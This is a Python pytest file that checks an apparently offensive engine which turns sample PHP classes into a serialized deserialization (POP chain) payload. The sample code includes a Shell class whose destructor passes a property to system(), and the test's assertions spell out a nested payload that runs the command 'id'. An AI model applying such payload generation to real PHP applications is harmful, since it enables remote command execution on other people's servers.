import pytest
from core_v2.engine import Sd0pEngineV2

def test_magic_shell_e2e():
    engine = Sd0pEngineV2()
    
    code = """
    <?php
    class Magic {
        public $prop;
        public $value;
        public function __destruct() {
            $var = $this->prop;
            $this->$var = $this->value;
        }
    }
    class Shell {
        public $cmd;
        public function __destruct() {
            system($this->cmd);
        }
    }
    ?>
    """
    payload = engine.analyze_and_generate(code)
    
    print(f"Generated Payload: {repr(payload)}")
    
    # 验证关键点
    assert "O:5:\"Magic\":2:{" in payload, f"Payload missing Magic header: {payload}"
    assert "s:4:\"prop\";s:5:\"shell\";" in payload, f"Payload prop is incorrect: {payload}"
    assert "s:5:\"value\";O:5:\"Shell\":1:{" in payload, f"Payload missing nested Shell object: {payload}"
    assert "s:3:\"cmd\";s:2:\"id\";" in payload, f"Payload cmd is incorrect: {payload}"
    
    print("✅ Magic/Shell dynamic property test passed!")

if __name__ == "__main__":
    test_magic_shell_e2e()
